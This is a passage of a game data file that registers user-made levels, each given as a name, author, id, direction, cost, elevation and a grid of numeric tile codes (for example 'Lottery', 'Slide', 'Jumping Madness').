100,5,24,24,24,1,124,124,0,0,0,0,0,0,0,0,0,109,109,1,5,5,23,23,23,1,124,124,0,0,0,0,0,0,0,0,67,109,97,1,96,96,22,22,22,1,1,124,130,0,0,3,0,0,3,67,65,109,1,1,96,96,21,21,21,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,21,21,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,2,21,21,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,2,21,21,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,67,67,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,67]});
maps.push({name="Boring Left Turn",author="Hichatu",id="#1652804059",direction="left",cost=144,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,1,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Lottery",author="tilgep",id="#1652805849",direction="right",cost=274,elevation=-4,map=[0,12,2,2,12,12,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,12,12,12,12,12,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,12,12,12,12,12,0,0,0,0,0,0,0,0,8,8,132,8,8,0,0,12,12,12,12,12,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,12,12,12,12,12,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,12,12,131,12,12,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,12,12,12,12,12,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,8,8,8,8,8,95,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,8,8,8,8,8,0,10,10,10,10,10,0,0,0,0,0,8,8,95,8,8,8,8,8,8,0,10,132,132,10,10,10,9,8,8,8,8,8,95,8,8,8,8,8,2,0,10,132,132,10,10,10,9,8,8,8,8,8,95,8,8,8,8,8,2,0,10,132,132,10,10,10,9,8,8,8,8,8,95,8,8,8,8,8,8,0,10,132,132,10,10,10,9,8,8,8,8,8,95,8,8,8,8,8,0,0,10,132,132,10,10,10,9,8,8,8,8,8,95,8,8,8,0,0,0,0,10,10,10,10,10,0,0,0,0,0,0,0,95,8,0,0,0,0,0]});
maps.push({name="lava lover",author="Spaick",id="#1652807647",direction="left",cost=458,elevation=-4,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,23,23,23,23,0,0,1,1,1,1,1,1,1,1,1,0,24,24,0,0,23,66,66,23,0,0,20,76,76,76,76,76,18,76,20,0,24,24,0,0,23,66,66,23,0,0,20,76,76,17,76,76,76,19,20,0,23,23,0,0,23,23,23,23,0,0,20,76,18,76,76,17,76,76,20,0,22,22,0,0,0,0,0,0,0,0,20,76,76,76,16,76,76,76,20,0,21,21,0,0,0,16,16,16,16,0,20,19,76,76,76,76,18,76,20,20,20,20,0,0,0,16,66,66,16,0,20,76,76,17,76,76,76,76,20,20,20,20,0,0,0,16,66,66,16,0,20,76,18,76,76,17,76,76,20,0,0,0,0,0,0,16,16,16,16,0,20,76,76,76,76,76,18,76,20,0,0,13,13,13,0,0,0,0,0,0,20,76,76,76,16,76,76,76,20,0,0,13,66,13,0,0,0,0,0,0,20,19,76,17,76,76,76,76,20,0,0,13,13,13,0,16,15,14,13,0,20,76,76,76,76,17,76,76,20,0,0,0,0,0,0,17,0,0,0,0,20,76,18,76,76,76,76,19,20,0,0,0,0,0,0,18,0,0,0,0,20,76,76,76,16,76,76,76,20,0,0,0,0,0,0,19,0,20,20,0,20,76,76,76,76,17,76,76,20,0,0,0,0,0,0,0,0,0,0,0,20,19,76,17,76,76,76,19,20,0,24,24,24,24,2,20,0,20,0,0,20,76,18,76,16,76,18,76,20,0,24,66,66,24,2,20,0,20,0,0,20,76,76,76,76,17,76,76,20,0,24,66,66,24,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,24,24,24,24]});
maps.push({name="Slide",author="Jando",id="#1652828974",direction="left",cost=201,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,17,17,0,0,0,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,17,17,0,0,0,23,23,0,0,0,0,0,23,23,0,0,0,0,0,0,17,17,0,0,0,23,23,0,0,0,0,0,23,23,0,0,0,0,0,0,17,17,0,0,0,23,23,0,0,0,0,0,23,23,0,0,0,0,0,0,91,91,0,0,0,23,23,0,0,0,0,0,23,23,0,0,0,0,0,0,91,91,0,0,0,23,23,0,0,0,0,0,23,23,0,0,0,0,0,0,91,91,0,0,0,23,23,0,0,0,0,0,23,23,0,0,0,0,0,0,17,17,0,0,2,23,23,0,0,0,0,0,23,23,0,130,130,130,130,130,17,17,0,0,2,23,23,0,0,0,0,0,135,135,0,130,130,130,130,130,17,17,0,0,0,135,135,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,135,135,23,0,0,0,0,135,135,23,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,23,135,135,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,23,135,135,23,23,23,23,23,135,135,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,0,0,23,0,0,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Slope",author="Jando",id="#1652829043",direction="left",cost=205,elevation=-19,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,0,0,0,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,0,0,0,0,0,21,21,21,21,21,21,21,21,21,21,21,21,21,21,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,9,9,9,22,0,0,0,0,0,0,0,0,2,5,95,6,6,7,7,7,8,8,22,0,0,0,0,0,0,0,0,0,2,5,95,6,6,7,7,7,8,8,22,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,22,22,22,0,0,0,0,0,0,0,0,0]});
maps.push({name="Fuck fortress",author="Luffaren",id="#1652892910",direction="right",cost=313,elevation=0,map=[1,1,112,1,112,1,112,1,1,77,77,0,0,0,0,2,2,0,0,0,1,90,109,90,109,109,109,90,1,9,9,8,7,6,5,5,5,0,0,0,1,109,109,109,109,109,89,109,109,9,9,8,7,6,5,5,5,0,0,0,1,30,97,24,9,9,109,109,109,9,9,0,0,0,0,96,96,0,0,0,1,31,24,100,9,9,109,90,1,90,9,77,0,0,0,96,96,0,0,0,1,32,0,0,9,90,109,109,1,0,0,0,0,0,0,96,96,0,0,0,1,33,0,0,9,9,9,9,124,44,0,0,0,0,0,5,5,0,0,0,1,34,0,24,9,9,24,9,1,44,0,0,0,0,67,5,5,0,0,0,1,35,0,0,9,90,9,9,124,44,0,0,0,67,65,5,5,0,0,0,1,36,0,0,9,9,109,109,1,0,0,44,44,67,65,5,5,96,5,2,1,37,0,0,90,9,109,109,1,1,1,1,44,0,67,5,5,96,5,2,1,38,0,0,0,9,0,0,0,0,24,1,0,0,0,96,96,0,0,0,1,39,0,0,77,9,77,0,0,0,0,124,0,0,0,96,96,0,0,0,1,40,0,0,77,9,77,0,0,0,0,124,0,0,0,5,85,0,0,0,1,41,0,0,0,9,0,0,0,0,24,1,0,0,0,5,5,77,0,0,1,42,0,93,9,89,9,9,8,7,6,105,5,5,5,89,5,77,0,0,1,43,0,94,9,9,90,9,8,7,6,105,5,5,5,5,5,77,0,0,1,44,44,0,0,0,0,0,0,0,24,1,0,0,0,5,5,77,0,0,1,24,44,24,0,24,0,24,0,24,24,1,0,0,0,94,5,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Drop the damn ring",author="MacBlub",id="#1652913383",direction="forward",cost=469,elevation=0,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,77,77,77,77,77,77,0,0,0,0,0,0,0,0,0,0,0,77,5,5,5,5,6,7,76,8,77,77,77,0,0,0,0,0,0,0,0,77,76,5,5,5,6,76,76,8,8,8,8,77,0,0,0,0,0,0,0,77,76,76,5,1,1,76,76,76,76,8,8,77,0,0,0,0,0,77,77,77,1,77,1,1,1,1,76,76,9,9,10,77,0,0,0,0,0,77,76,76,1,76,76,76,1,1,1,10,10,11,10,77,0,0,0,77,77,77,76,76,1,21,21,76,76,1,1,14,14,12,12,77,0,12,0,77,21,21,21,21,21,21,100,21,76,1,14,14,14,14,12,77,0,4,0,77,21,1,20,20,1,21,21,76,76,77,76,76,76,77,0,0,0,19,0,77,76,1,19,19,1,1,21,76,76,77,76,76,76,77,0,0,0,19,0,77,76,1,1,18,17,1,76,76,1,1,14,14,76,77,0,0,0,19,0,77,76,1,1,15,15,1,77,77,1,1,1,15,15,15,77,0,0,0,0,0,65,1,1,15,15,76,76,76,76,76,76,76,15,15,77,0,0,0,0,0,65,1,1,1,15,15,15,15,76,76,76,76,76,15,77,0,19,19,0,0,6,1,1,1,15,15,15,15,15,15,76,76,76,15,77,0,19,19,0,0,5,5,1,1,1,0,77,0,77,15,96,96,15,15,77,0,97,19,0,0,5,5,5,1,1,0,0,0,0,77,0,0,77,77,0,0,0,0,0,0,0,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Dont Be Hasty",author="tilgep",id="#1652915042",direction="right",cost=280,elevation=-2,map=[0,21,21,2,2,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,0,0,0,0,0,0,92,0,0,92,0,0,0,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,44,0,21,21,21,21,21,21,21,96,0,0,0,0,0,96,0,0,0,0,100,0,21,21,21,21,21,21,21,96,0,0,0,0,96,24,96,0,0,0,44,0,1,1,21,21,21,1,1,0,0,0,0,0,0,24,0,0,0,0,43,0,0,1,95,95,95,1,1,22,22,22,0,0,0,24,0,0,0,0,43,0,0,1,21,21,21,1,1,22,22,22,22,0,0,23,0,0,0,0,0,0,0,1,92,1,92,1,1,22,22,22,22,22,0,23,0,0,0,0,0,0,0,1,110,50,110,50,1,22,22,22,22,22,22,22,22,21,20,19,19,0,0,1,50,50,50,50,1,22,22,22,22,22,22,22,22,21,20,19,19,0,0,1,50,50,50,50,1,22,22,22,22,22,22,22,22,21,20,19,19,0,0,1,50,50,50,50,1,22,22,22,22,97,22,22,22,21,20,19,2,0,0,1,50,50,50,110,92,22,22,22,22,22,22,22,22,21,20,19,2,0,0,1,96,50,50,50,1,22,22,22,22,22,22,22,22,21,20,19,19,0,0,1,110,96,50,50,1,22,22,22,22,22,22,22,22,21,20,19,19,0,0,1,3,1,1,1,44,22,0,0,0,0,0,0,0,0,0,0,0,0,0,1,44,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Straight or Strafe",author="MacBlub",id="#1652996875",direction="forward",cost=192,elevation=0,map=[25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,25,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,25,65,65,0,0,0,130,130,130,130,130,130,130,130,130,0,0,0,128,14,25,65,65,0,0,0,130,130,130,130,130,130,130,130,130,0,0,0,128,14,25,65,65,0,0,0,0,0,130,130,0,0,0,0,0,0,0,14,14,14,25,25,25,0,0,0,0,0,130,130,0,0,0,0,0,0,0,14,94,14,0,90,25,0,0,0,0,0,130,130,0,0,0,0,0,0,0,14,14,14,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,0,25,65,65,25,0,0,0,0,0,0,0,0,0,0,27,27,0,0,0,0,25,65,65,25,26,27,28,29,30,31,32,33,0,0,28,28,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,33,0,0,29,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,0,0,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,0,0,32,32,0,0,0,0,0,0,0,0,0,39,39,39,0,0,0,37,0,0,33,33,34,34,34,0,0,0,0,0,0,39,93,39,39,39,39,38,0,34,34,34,34,34,65,0,0,0,0,0,0,39,128,39,39,39,39,39,0,34,2,2,34,34,34,0,0,0,0,0,0,39,39,39,0,0,0,0,0]});
maps.push({name="funcmapfix",author="mattaka",id="#1653053841",direction="right",cost=214,elevation=18,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,2,2,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,15,15,90,15,130,130,130,130,9,0,8,90,6,6,90,0,0,0,0,15,90,15,15,15,130,130,130,130,0,0,8,8,7,7,0,0,0,0,15,15,15,15,15,15,130,130,130,130,0,0,8,8,90,0,0,0,0,91,15,15,15,15,15,90,130,130,130,130,9,0,8,8,0,0,0,0,0,14,91,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,99,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,13,13,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,95,2,96,96,0,0,0,0,0,0,0,0,0,0,1,132,24,24,24,24,95,2,98,98,0,0,0,0,13,13,0,13,93,0,1,1,1,1,1,1,1,1,98,98,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,12,12,90,13,13,13,13,19,19,19,19,0,0,0,0,0,0,0,0,0,12,12,13,13,13,13,92,19,19,19,131,0,0,0,0,0,0,0,0,0,0,90,13,13,90,13,13,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Free Your Mind Neo",author="tilgep",id="#1653070943",direction="forward",cost=434,elevation=-1,map=[0,0,0,15,15,15,15,15,15,2,2,15,15,15,15,15,15,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,2,2,14,14,14,14,14,14,0,0,0]});
maps.push({name="Surround",author="tilgep",id="#1653072639",direction="forward",cost=254,elevation=12,map=[28,28,28,28,28,28,28,28,28,2,2,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,0,92,92,0,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,28,28,28,28,0,0,92,0,120,120,120,120,120,120,0,92,0,0,28,28,28,28,28,28,0,0,0,0,120,120,120,120,120,120,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,1,120,120,1,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,1,120,120,1,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,120,120,120,120,0,0,0,0,0,28,28,28,28,28,28,0,0,92,0,0,120,1,1,120,0,0,92,0,0,28,28,28,28,28,28,0,0,0,0,0,120,120,120,120,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,1,120,120,1,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,1,120,120,1,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,1,120,120,1,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,120,120,120,120,0,0,0,0,0,28,28,28,28,28,28,0,0,92,0,0,120,120,120,120,0,0,92,0,0,28,28,28,28,28,28,0,0,0,0,0,120,120,120,120,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,1,2,2,1,0,0,0,0,0,28,28,28]});
maps.push({name="Down the Hatch",author="tilgep",id="#1653073139",direction="forward",cost=300,elevation=-15,map=[0,0,0,0,0,0,0,0,42,2,2,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,42,42,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,42,42,42,42,42,42,0,0,0,0,0,0,0,0,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,0,0,0,0,42,42,42,42,42,42,42,22,22,42,42,42,42,42,42,42,0,0,0,0,42,42,1,1,1,1,1,92,92,1,1,1,1,1,42,42,0,0,0,0,42,42,1,33,107,107,107,107,107,107,107,33,107,1,42,42,0,0,0,0,42,42,1,107,107,107,107,107,107,107,107,107,107,1,42,42,0,0,0,0,42,42,1,107,107,107,107,107,33,107,107,107,107,1,42,42,0,0,0,0,42,22,92,107,107,107,107,33,33,107,107,107,107,92,22,42,0,0,0,0,42,42,1,107,107,107,107,107,107,107,107,107,107,1,42,42,0,0,0,0,42,42,1,107,107,107,107,107,107,107,107,107,107,1,42,42,0,0,0,0,42,42,1,107,107,33,107,107,107,107,107,33,107,1,42,42,0,0,0,0,42,42,1,33,107,33,107,107,107,107,107,33,107,1,42,42,0,0,0,0,42,42,1,107,107,107,107,107,33,107,107,107,107,1,42,42,0,0,0,0,42,42,1,107,107,107,107,107,107,107,107,107,107,1,42,42,0,0,0,0,42,22,92,107,107,107,107,107,107,107,107,107,107,92,22,42,0,0,0,0,42,42,1,107,107,33,107,107,107,107,107,107,107,1,42,42,0,0,0,0,0,0,1,107,107,107,107,107,107,107,107,107,33,1,0,0,0,0,0,0,0,0,1,1,1,1,1,2,2,1,1,1,1,1,0,0,0,0]});
maps.push({name="ez climb",author="Schnouf",id="#1653075850",direction="left",cost=246,elevation=9,map=[0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,1,0,12,0,11,0,10,0,9,0,8,0,7,0,6,0,0,92,92,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,13,0,0,0,0,0,0,0,0,0,0,0,6,0,1,0,0,0,1,0,0,0,0,0,67,67,67,67,67,0,0,0,0,0,1,0,0,0,1,0,14,0,0,67,24,24,24,24,24,67,0,0,6,0,1,0,0,1,1,0,14,0,0,67,24,24,24,24,24,67,0,0,0,0,1,0,0,0,0,0,14,0,0,67,24,24,94,24,24,67,0,0,6,0,1,0,0,2,14,14,14,0,92,67,24,24,24,24,24,67,0,0,0,0,5,5,5,2,14,14,14,0,92,67,24,24,24,24,24,67,0,0,0,0,5,5,5,0,0,0,14,0,0,67,24,24,93,24,24,67,0,0,6,0,1,1,1,1,1,0,14,0,0,67,24,24,24,24,24,67,0,0,0,0,1,0,0,0,1,0,14,0,0,67,24,24,24,24,24,67,0,0,6,0,1,0,0,0,1,0,0,0,0,0,67,67,67,67,67,0,0,0,0,0,1,0,0,0,1,0,13,0,0,0,0,0,0,0,0,0,0,0,6,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,12,0,11,0,10,0,9,0,8,0,7,0,6,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="Jumping Madness",author="MacBlub",id="#1653335060",direction="forward",cost=804,elevation=-10,map=[0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,24,24,24,24,1,1,1,1,1,1,1,1,1,1,124,124,124,124,124,1,1,24,24,1,1,124,124,124,124,124,124,124,1,1,124,125,127,125,125,125,125,128,129,125,125,125,125,125,125,127,125,124,1,1,124,126,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,124,1,1,124,125,125,126,125,128,125,129,125,125,129,125,125,127,125,125,125,124,1,1,124,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,124,1,1,124,125,125,125,125,125,126,125,125,125,125,125,125,125,125,125,125,124,1,1,124,125,129,125,125,125,125,125,125,127,126,125,125,125,125,128,125,124,1,1,124,125,125,125,128,125,125,125,125,125,125,125,125,125,125,125,125,124,1,1,124,129,125,125,125,125,125,125,129,125,125,125,129,125,125,125,125,124,1,1,124,125,129,125,125,129,125,125,125,125,125,129,125,125,125,125,125,124,1,1,124,125,125,125,125,125,125,127,125,125,125,125,128,125,125,125,126,124,1,1,124,125,127,125,125,125,125,125,125,128,125,125,125,125,125,125,125,124,1,1,1,127,127,127,125,125,125,125,125,125,125,125,125,128,125,125,125,124,1,1,1,64,64,64,126,125,125,125,126,125,125,127,125,125,125,125,129,124,1,1,124,65,65,124,1,124,124,124,124,124,124,124,124,124,124,124,124,124,1,1,65,65,65,65,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,65,65,65,24,23,22,21,20,19,18,17,16,15,14,14,14,14,14,0,1,65,65,65,24,23,22,21,20,19,18,17,16,15,14,14,2,2,14,0]});
maps.push({name="Acrophobia",author="tilgep",id="#1653422560",direction="right",cost=245,elevation=-6,map=[1,2,2,1,1,1,1,20,0,19,0,18,0,17,0,16,0,0,0,0,1,24,24,24,23,22,21,20,0,19,0,18,0,17,0,16,0,0,0,0,1,24,24,24,23,22,21,20,0,19,0,18,0,17,0,16,0,0,0,0,1,44,44,1,23,22,21,20,0,19,0,18,0,17,0,16,0,0,0,0,1,25,1,1,0,0,0,0,118,19,119,18,120,17,120,16,121,0,0,0,1,25,25,1,0,0,0,19,19,19,0,18,0,17,0,16,0,0,0,0,1,1,25,1,0,0,0,0,117,0,0,18,0,17,0,16,122,0,0,0,1,25,25,1,0,0,18,18,18,18,18,18,0,17,0,16,0,0,0,0,1,131,1,1,0,0,0,0,116,0,0,0,0,17,0,16,123,0,0,0,1,5,5,1,40,0,41,0,0,40,0,0,40,0,0,16,0,0,0,0,1,1,1,1,41,0,0,0,115,0,0,0,0,0,0,16,124,0,0,0,1,44,132,44,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,114,0,0,0,40,18,18,18,18,0,0,0,1,25,25,0,0,0,0,0,0,0,0,0,0,18,65,65,18,18,0,0,1,105,105,0,0,0,0,0,113,0,0,0,0,18,65,65,65,18,18,18,1,105,105,0,0,0,0,0,0,0,0,0,0,18,65,65,65,18,18,2,1,105,106,107,108,109,110,111,112,112,112,112,112,18,65,65,65,65,18,2,1,105,106,107,108,109,110,111,112,112,112,112,112,18,65,65,65,65,18,18,1,105,105,0,0,0,0,0,0,0,112,112,3,18,18,65,65,65,18,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,18,67,67,67,18,0]});
maps.push({name="Banana For Scale",author="tilgep",id="#1653959430",direction="left",cost=117,elevation=-1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,0,2,39,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,2,39,39,40,40,0,0,0,0,0,40,40,40,40,40,40,40,40,40,0,0,39,39,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,0,0,0,39,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,0,0,0,0,39,40,40,40,40,40,40,40,40,40,40,40,40,40,40,0,0,0,0,0,0,40,40,40,40,40,40,40,40,40,40,40,40,40,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
